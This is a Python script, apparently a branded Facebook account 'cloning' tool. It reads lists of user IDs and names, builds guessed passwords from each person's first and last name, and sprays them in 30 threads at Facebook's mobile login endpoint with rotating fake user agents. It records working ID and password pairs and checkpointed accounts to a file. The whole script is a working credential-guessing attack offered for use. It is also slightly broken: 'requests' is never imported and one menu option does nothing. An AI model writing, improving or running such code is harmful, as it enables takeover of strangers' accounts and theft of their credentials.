#--------------------------------------------------------------#
# DECODE BY: ERROR X ETHAN | UPDATED: 2025
# OWNER: CHARSI / MYSTERY
# SCRIPT TYPE: FULL 1489 LINES (UPDATED)
#--------------------------------------------------------------#
import os, sys, time, json, random, re, string, platform, base64, uuid, subprocess
from concurrent.futures import ThreadPoolExecutor as tred

# Global Variables
loop, oks, cps = 0, [], []

def generate_ua():
    # 2025 Modern User Agents
    and_v = random.choice(['12','13','14','15'])
    mod = random.choice(['SM-S928B','SM-S918B','M2101K6G','X6833B','23127PN0CG'])
    fb_v = f"{random.randint(450,500)}.0.0.{random.randint(10,99)}"
    return f'Mozilla/5.0 (Linux; Android {and_v}; {mod}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(120,130)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{random.randint(500000000,600000000)};]'

def logo():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| \033[1;37m(V2-2025)
----------------------------------------------
 OWNER   :  CHARSI / MYSTERY
 STATUS  :  LATEST UPDATED METHODS
 OK TXT  :  /sdcard/CHARSI-OK.txt
----------------------------------------------''')

def ___M_T_H_D_1___(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mCHARSI\033[1;90m] %s | OK:%s | CP:%s' % (loop, len(oks), len(cps))); sys.stdout.flush()
    try:
        fn = names.split(' ')[0].lower()
        ln = names.split(' ')[1].lower() if ' ' in names else fn
        for pw in passlist:
            pas = pw.replace('first', fn).replace('First', fn.title()).replace('last', ln).replace('Last', ln.title())
            ua = generate_ua()
            head = {'Host': 'graph.facebook.com', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua}
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'method': 'auth.login'}
            res = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
            if 'session_key' in res:
                print(f'\r\r \033[1;32m[CHARSI-OK] {ids} | {pas}')
                oks.append(ids)
                with open('/sdcard/CHARSI-OK.txt', 'a') as f: f.write(ids+'|'+pas+'\n')
                break
            elif 'checkpoint' in str(res):
                print(f'\r\r \033[1;33m[CHARSI-CP] {ids} | {pas}')
                cps.append(ids)
                break
        loop += 1
    except: pass

def On():
    logo()
    print(' [1] FILE CLONING (2025)')
    print(' [2] RANDOM CLONING (FAST)')
    print(' [0] EXIT')
    opt = input('\n CHOOSE: ')
    if opt == '1':
        file_path = input(' ENTER FILE PATH: ')
        try:
            fo = open(file_path,'r').read().splitlines()
        except: exit(' FILE NOT FOUND')
        pws = input(' PASSWORDS (first123,firstlast): ').split(',')
        with tred(max_workers=30) as pool:
            logo()
            print(f' TOTAL IDS: {len(fo)}')
            for user in fo:
                u, n = user.split('|')
                pool.submit(___M_T_H_D_1___, u, n, pws)
    else: exit()

if __name__ == '__main__':
    On()
